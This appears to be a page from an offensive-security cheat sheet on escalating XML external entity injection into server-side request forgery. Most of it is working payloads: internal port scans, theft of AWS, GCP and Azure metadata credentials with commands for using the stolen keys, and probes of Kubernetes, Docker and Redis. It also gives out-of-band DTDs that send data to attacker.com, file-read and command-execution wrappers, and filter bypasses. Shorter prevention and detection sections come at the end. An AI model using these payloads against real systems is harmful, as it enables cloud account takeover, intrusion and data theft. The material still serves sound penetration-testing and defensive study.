---
tags:
  - critical
---

# XXE → SSRF → Internal Access

Weaponizing XML parsers to reach internal infrastructure.

## TL;DR

XXE (XML External Entity) injection can be escalated to SSRF (Server-Side Request Forgery) by abusing XML entity definitions to make the server fetch arbitrary URLs. This chain is particularly devastating in cloud environments where metadata services expose credentials.

**Chain:** Vulnerable XML Parser → Entity Injection → Server-Side Requests → Internal Access/Cloud Takeover

---

## Overview

```
XXE Injection
    ↓
┌───────────────────────────────┐
│  SSRF via Entity Definition  │
└───────────────────────────────┘
    ↓                    ↓                    ↓
Internal Port Scan   Cloud Metadata      Internal Services
    ↓                    ↓                    ↓
Service Discovery   AWS/GCP/Azure Creds  Admin Panels
    ↓                    ↓                    ↓
  RCE/Data           Cloud Takeover      Sensitive Data
```

---

## Chain 1: XXE → Internal Port Scanning

**Goal:** Discover internal services via timing/error differences

### Basic Port Scan Payload

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://127.0.0.1:PORT/">
]>
<foo>&xxe;</foo>
```

### Port Scan Methodology

```bash
# Ports to enumerate
22    # SSH
80    # HTTP
443   # HTTPS
3306  # MySQL
5432  # PostgreSQL
6379  # Redis
8080  # HTTP Alt / Tomcat
8443  # HTTPS Alt
9200  # Elasticsearch
27017 # MongoDB
```

### Timing-Based Detection

```xml
<!-- Open port: Fast response or connection -->
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1:22/">]>

<!-- Closed port: Timeout or connection refused -->
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1:12345/">]>
```

### Network Range Scanning

```xml
<!-- Scan internal network ranges -->
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://10.0.0.1/">]>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://172.16.0.1/">]>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://192.168.1.1/">]>

<!-- Common internal hostnames -->
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://localhost/">]>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://internal/">]>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://intranet/">]>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://db/">]>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://redis/">]>
```

---

## Chain 2: XXE → AWS Metadata → Credential Theft

**Requirements:** Application running on AWS EC2 with IMDSv1 enabled

### Step 1: Basic Metadata Access

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<stockCheck><productId>&xxe;</productId></stockCheck>
```

**Response reveals:** `ami-id hostname iam/ instance-id ...`

### Step 2: Get IAM Role Name

```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
]>
<foo>&xxe;</foo>
```

**Response:** `admin-role` (or whatever role is attached)

### Step 3: Extract Credentials

```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin-role">
]>
<foo>&xxe;</foo>
```

**Response:**
```json
{
  "AccessKeyId": "ASIAXXX...",
  "SecretAccessKey": "xxx...",
  "Token": "xxx...",
  "Expiration": "2024-01-01T00:00:00Z"
}
```

### Step 4: Use Stolen Credentials

```bash
export AWS_ACCESS_KEY_ID="ASIAXXX..."
export AWS_SECRET_ACCESS_KEY="xxx..."
export AWS_SESSION_TOKEN="xxx..."

# Enumerate access
aws sts get-caller-identity
aws s3 ls
aws ec2 describe-instances
aws secretsmanager list-secrets
```

### Other Useful AWS Metadata Endpoints

```xml
<!-- User data (startup scripts - may contain secrets) -->
<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/user-data">

<!-- Instance identity document -->
<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/dynamic/instance-identity/document">

<!-- Network info -->
<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/local-ipv4">
<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/public-ipv4">

<!-- Security groups -->
<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/security-groups">
```

---

## Chain 3: XXE → GCP Metadata → Service Account Takeover

**Requirements:** Application running on Google Cloud Compute Engine

### Access Token Extraction

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token">
]>
<foo>&xxe;</foo>
```

**Note:** GCP requires `Metadata-Flavor: Google` header - XXE typically can't set headers. Alternative approach:

### Metadata Without Header (Legacy)

```xml
<!-- Some older GCP configs accept v1beta1 without header -->
<!ENTITY xxe SYSTEM "http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token">
```

### Other GCP Metadata Endpoints

```xml
<!-- Project info -->
<!ENTITY xxe SYSTEM "http://metadata.google.internal/computeMetadata/v1/project/project-id">

<!-- Instance attributes (may contain secrets) -->
<!ENTITY xxe SYSTEM "http://metadata.google.internal/computeMetadata/v1/instance/attributes/">

<!-- SSH keys -->
<!ENTITY xxe SYSTEM "http://metadata.google.internal/computeMetadata/v1/project/attributes/ssh-keys">

<!-- Service account email -->
<!ENTITY xxe SYSTEM "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email">
```

### Use Stolen GCP Token

```bash
# Set token
export TOKEN="ya29.xxx..."

# Enumerate access
curl -H "Authorization: Bearer $TOKEN" \
  "https://www.googleapis.com/storage/v1/b?project=PROJECT_ID"

curl -H "Authorization: Bearer $TOKEN" \
  "https://cloudresourcemanager.googleapis.com/v1/projects"
```

---

## Chain 4: XXE → Azure Metadata → Managed Identity

**Requirements:** Application running on Azure VM/App Service with Managed Identity

### Access Token Extraction

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/">
]>
<foo>&xxe;</foo>
```

**Note:** Azure requires `Metadata: true` header - similar limitation to GCP.

### IMDS v1 (No Header Required)

```xml
<!-- Older Azure IMDS may not require header -->
<!ENTITY xxe SYSTEM "http://169.254.169.254/metadata/instance?api-version=2017-08-01">
```

### Other Azure Metadata Endpoints

```xml
<!-- Instance info -->
<!ENTITY xxe SYSTEM "http://169.254.169.254/metadata/instance?api-version=2021-02-01">

<!-- Subscription ID -->
<!ENTITY xxe SYSTEM "http://169.254.169.254/metadata/instance/compute/subscriptionId?api-version=2021-02-01&format=text">

<!-- Resource group -->
<!ENTITY xxe SYSTEM "http://169.254.169.254/metadata/instance/compute/resourceGroupName?api-version=2021-02-01&format=text">
```

---

## Chain 5: XXE → Internal Services

### Redis via XXE (Limited - HTTP Only)

```xml
<!-- Probe Redis -->
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1:6379/">]>
<foo>&xxe;</foo>
```

**Better approach:** If server supports other protocols:

```xml
<!-- gopher:// for raw TCP (parser dependent) -->
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "gopher://127.0.0.1:6379/_INFO">
]>
```

### Elasticsearch

```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://127.0.0.1:9200/_cat/indices">
]>
<foo>&xxe;</foo>

<!-- Search for sensitive data -->
<!ENTITY xxe SYSTEM "http://127.0.0.1:9200/_search?q=password">
<!ENTITY xxe SYSTEM "http://127.0.0.1:9200/users/_search">
```

### Kubernetes API

```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "https://kubernetes.default.svc/api/v1/namespaces/default/secrets">
]>

<!-- Via kubelet -->
<!ENTITY xxe SYSTEM "http://127.0.0.1:10255/pods">
```

### Docker API

```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://127.0.0.1:2375/containers/json">
]>
```

### Admin Panels

```xml
<!-- Common admin endpoints -->
<!ENTITY xxe SYSTEM "http://127.0.0.1:8080/admin">
<!ENTITY xxe SYSTEM "http://127.0.0.1:8080/manager/html">
<!ENTITY xxe SYSTEM "http://127.0.0.1:8443/admin">
<!ENTITY xxe SYSTEM "http://127.0.0.1:9090/">
```

---

## Chain 6: Blind XXE with OOB to SSRF

When XXE response is not reflected, use out-of-band techniques:

### Step 1: Host Malicious DTD

```dtd
<!-- evil.dtd on attacker server -->
<!ENTITY % file SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin-role">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://attacker.com/?data=%file;'>">
%eval;
%exfiltrate;
```

### Step 2: Inject XXE Referencing External DTD

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
  %xxe;
]>
<foo>test</foo>
```

### OOB via Parameter Entities

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
  %xxe;
]>
<foo>&send;</foo>
```

**evil.dtd:**
```dtd
<!ENTITY % data SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
<!ENTITY % param1 "<!ENTITY send SYSTEM 'http://attacker.com/?%data;'>">
%param1;
```

### DNS Exfiltration

```dtd
<!-- When HTTP is blocked, use DNS -->
<!ENTITY % data SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://%data;.attacker.com/'>">
%eval;
%exfil;
```

### Error-Based Data Exfiltration

```dtd
<!-- evil.dtd - triggers error containing data -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```

---

## Chain 7: XXE in Different Contexts

### SVG Upload → XXE → SSRF

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<svg xmlns="http://www.w3.org/2000/svg" width="200" height="200">
  <text x="10" y="20">&xxe;</text>
</svg>
```

### DOCX/XLSX → XXE → SSRF

```bash
# Unzip office document
unzip document.docx -d docx_contents

# Edit [Content_Types].xml or document.xml
cat >> docx_contents/[Content_Types].xml << 'EOF'
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
EOF

# Repack
cd docx_contents && zip -r ../malicious.docx *
```

### SOAP Request → XXE → SSRF

```xml
<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope">
  <soap:Body>
    <foo>
      <![CDATA[<!DOCTYPE doc [<!ENTITY % xxe SYSTEM "http://169.254.169.254/latest/meta-data/"> %xxe;]><x/>]]>
    </foo>
  </soap:Body>
</soap:Envelope>
```

### XInclude (When DOCTYPE is Blocked)

```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="http://169.254.169.254/latest/meta-data/"/>
</foo>
```

### Content-Type Switching

```http
POST /api/endpoint HTTP/1.1
Content-Type: text/xml

<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
<root><data>&xxe;</data></root>
```

---

## Real-World Examples

### Capital One (2019)
- **Chain:** SSRF in WAF → AWS Metadata → S3 Access → 100M customer records
- **Root Cause:** Misconfigured WAF allowed SSRF to metadata service
- **Impact:** $80M fine, one of largest data breaches

### GitLab (CVE-2021-22214)
- **Chain:** XXE in CI/CD → Internal network access → Credential exfiltration
- **Root Cause:** XML parsing in wiki markdown rendering

### Shopify (HackerOne Report)
- **Chain:** XXE in image processing → Internal service discovery
- **Impact:** $25,000 bounty

### Facebook (ImageTragick + XXE)
- **Chain:** Image upload → XXE in SVG → Internal network enumeration

### Microsoft Azure (CVE-2021-27075)
- **Chain:** XXE in Azure Function → Managed Identity token theft
- **Impact:** Cross-tenant privilege escalation

---

## Bypasses for XXE → SSRF

### IP Address Bypass

```xml
<!-- Decimal IP (127.0.0.1 = 2130706433) -->
<!ENTITY xxe SYSTEM "http://2130706433/">

<!-- Octal IP -->
<!ENTITY xxe SYSTEM "http://0177.0.0.1/">

<!-- Hex IP -->
<!ENTITY xxe SYSTEM "http://0x7f.0x0.0x0.0x1/">

<!-- IPv6 -->
<!ENTITY xxe SYSTEM "http://[::1]/">
<!ENTITY xxe SYSTEM "http://[0:0:0:0:0:ffff:127.0.0.1]/">

<!-- URL shorteners don't work for XXE, but DNS rebinding does -->
<!ENTITY xxe SYSTEM "http://127.0.0.1.nip.io/">
<!ENTITY xxe SYSTEM "http://localtest.me/">
```

### Protocol Wrappers

```xml
<!-- file:// for local files -->
<!ENTITY xxe SYSTEM "file:///etc/passwd">

<!-- php:// wrapper (PHP apps) -->
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">

<!-- expect:// for RCE (if enabled) -->
<!ENTITY xxe SYSTEM "expect://id">

<!-- jar:// for Java apps -->
<!ENTITY xxe SYSTEM "jar:http://attacker.com/evil.jar!/file.txt">

<!-- netdoc:// (older Java) -->
<!ENTITY xxe SYSTEM "netdoc:///etc/passwd">
```

### Encoding Bypass

```xml
<!-- UTF-7 encoding -->
<?xml version="1.0" encoding="UTF-7"?>
+ADw-!DOCTYPE foo +AFs-+ADw-!ENTITY xxe SYSTEM +ACI-http://169.254.169.254/+ACI-+AD4-+AF0-+AD4-

<!-- HTML entities in DTD -->
<!ENTITY % dtd SYSTEM "&#104;&#116;&#116;&#112;&#58;&#47;&#47;attacker.com/evil.dtd">
```

---

## Impact Table

| XXE Target | Chain | Impact |
|------------|-------|--------|
| Internal port scan | → Service discovery | Low-Medium |
| AWS IMDSv1 | → IAM credentials → Cloud takeover | Critical |
| GCP metadata | → Service account token | Critical |
| Azure IMDS | → Managed identity token | Critical |
| Kubernetes API | → Cluster secrets | Critical |
| Internal admin | → Admin access | High |
| Internal services | → Data exfil / RCE | High-Critical |

---

## Prevention

### 1. Disable External Entities

**Java:**
```java
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
```

**Python (defusedxml):**
```python
import defusedxml.ElementTree as ET
tree = ET.parse(xml_file)  # Safe by default
```

**PHP:**
```php
libxml_disable_entity_loader(true);
```

**.NET:**
```csharp
XmlReaderSettings settings = new XmlReaderSettings();
settings.DtdProcessing = DtdProcessing.Prohibit;
settings.XmlResolver = null;
```

### 2. Cloud Metadata Protections

**AWS - Enforce IMDSv2:**
```bash
aws ec2 modify-instance-metadata-options \
  --instance-id i-xxx \
  --http-tokens required \
  --http-put-response-hop-limit 1
```

**GCP - Require headers:**
- Already requires `Metadata-Flavor: Google` header by default

**Azure - Use IMDS v2:**
- Configure identity restrictions

### 3. Network-Level Controls

- Block outbound traffic from application servers to metadata IPs
- Use network policies to restrict internal communication
- Implement egress filtering

### 4. Input Validation

- Validate and sanitize XML input
- Use allowlists for expected XML structure
- Strip DOCTYPE declarations before parsing

### 5. WAF Rules

- Block requests containing `<!DOCTYPE`, `<!ENTITY`, `SYSTEM`
- Detect metadata IP addresses in payloads

---

## Detection

### Log Patterns

```
# Suspicious XML in logs
<!DOCTYPE.*ENTITY.*SYSTEM
http://169.254.169.254
http://metadata.google.internal
http://127.0.0.1
gopher://
file:///
```

### Network Monitoring

- Outbound connections to 169.254.169.254
- DNS lookups for internal hostnames
- Connections to internal IP ranges from public-facing apps

---

## PoC Template

```markdown
## Summary
XXE in [endpoint] escalates to SSRF, exposing [internal service / cloud metadata].

## Chain
1. XXE vulnerability in XML parser at [endpoint]
2. External entity fetches [internal URL]
3. Response/credentials exfiltrated via [method]

## Steps
1. Submit XML payload with external entity:
   ```xml
   [XXE payload]
   ```
2. Observe [response/OOB callback]
3. Extract credentials/data

## Impact
[AWS credential theft / Internal data access / etc.]

CVSS: 9.1 (Critical) - Network-based, no auth, confidentiality breach
```

---

*Related: [SSRF to RCE](ssrf-to-rce.md) | [XSS to ATO](xss-to-ato.md)*
